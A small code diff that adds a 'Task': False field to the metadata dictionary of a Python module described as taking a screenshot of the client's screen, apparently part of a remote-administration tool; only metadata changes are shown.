@@ -8,7 +8,8 @@ class Module:
         self.info = {
             "Author": ["Marten4n6"],
             "Description": "Takes a screenshot of the client's screen.",
-            "References": []
+            "References": [],
+            "Task": False
         }
         self.output_folder = None
 
